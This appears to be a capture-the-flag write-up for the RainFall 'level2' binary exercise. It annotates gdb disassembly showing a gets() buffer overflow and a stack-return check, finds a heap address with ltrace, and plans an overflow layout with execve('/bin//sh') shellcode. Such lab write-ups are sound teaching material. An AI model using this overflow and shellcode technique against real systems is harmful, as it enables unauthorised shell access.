1) Main function
---------------


gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    


from the main function we can see that there is call function inside it calling "p"

2) p function
--------------

(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp                                                             0x68 bytes = 104 bytes  So inside this function, 104 bytes of local variables are reserved.
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax                                                   The buffer is located at: ebp - 4xc and (4xc = 76) so the buffer size is 76
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>                                               gets() reads unlimited input into a buffer.
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax                                                     
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax                                                   ❌ If we try to return to the stack → exit immediately.
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>


3) The stack is protected, let's walk trough the heap 
-----------------------------------------------------

Let's find heap adresse :

level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                               = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)    = 0xbffff6fc
puts(""
)                                         = 1
strdup("")                                       = 0x0804a008
+++ exited (status 8) +++


The heap adresse is 0x0804a008


4) Plan Attack Structure
------------------------

[ 76 bytes buffer ]
[ 4 bytes saved EBP ]
[ 4 bytes return address ]



0x0804a008:  push   0xb
0x0804a00a:  pop    eax
0x0804a00b:  cdq
0x0804a00c:  push   edx
0x0804a00d:  push   0x68732f2f
0x0804a012:  push   0x6e69622f
0x0804a017:  mov    ebx,esp
0x0804a019:  xor    ecx,ecx
0x0804a01b:  int    0x80
